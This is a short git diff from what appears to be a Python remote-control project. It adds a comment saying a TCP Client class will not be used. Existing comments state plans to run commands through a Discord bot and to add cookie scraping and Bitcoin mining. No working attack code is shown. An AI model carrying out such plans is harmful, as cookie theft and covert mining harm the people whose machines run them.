@@ -9,6 +9,8 @@ from system.processmanager import ProcessManager
 # we are going to have to find a way to connect to our discord bot and execute commands from there
 #im thinking of using some form of tcp who knows or cares right now we just need to add more features maybe cookie scraping and bitcoin mining
 
+
+# This not going to be used it was just an idea in the next commit expect a change or implement your own method
 class Client:
 
     def __init__(self, host='localhost', port=65432) -> None:
